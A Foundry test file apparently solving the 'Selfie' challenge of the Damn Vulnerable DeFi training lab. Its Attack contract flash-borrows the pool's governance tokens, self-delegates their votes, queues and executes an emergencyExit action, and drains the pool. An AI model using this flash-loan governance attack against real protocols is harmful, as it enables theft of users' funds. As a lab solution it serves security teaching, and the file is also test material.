// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {ISimpleGovernance} from "../../src/selfie/ISimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

// 최소한으로 필요한 풀/토큰 인터페이스
interface ISelfiePool {
    function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
        external
        returns (bool);
    function governance() external view returns (SimpleGovernance);
    function emergencyExit(address) external;
}

interface IDamnValuableVotes {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function delegate(address delegatee) external;
    function snapshot() external returns (uint256);
}

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        Attack a = new Attack(address(pool),address(governance), address(token),recovery);
        a.step1();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}

contract Attack is Test{
    address recovery;
    ISelfiePool pool;
    ISimpleGovernance gov;
    IDamnValuableVotes token;
    constructor(address _pool, address _gov, address _token, address _recovery){
        pool=ISelfiePool(_pool);
        gov=ISimpleGovernance(_gov);
        token=IDamnValuableVotes(_token);
        recovery=_recovery;
    }

    function step1() external {
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), 1_500_000e18, "");
        vm.warp(block.timestamp + 2 days);
        console.log(token.balanceOf(address(pool)));
        gov.executeAction(1);
    }

    function onFlashLoan(address initiator, address tokenAddr, uint256 amount, uint256 fee, bytes calldata data)
        public returns(bytes32)
    {
        token.delegate(address(this));
        gov.queueAction(address(pool), 0, abi.encodeCall(ISelfiePool.emergencyExit,recovery));   
        IDamnValuableVotes(tokenAddr).approve(address(pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
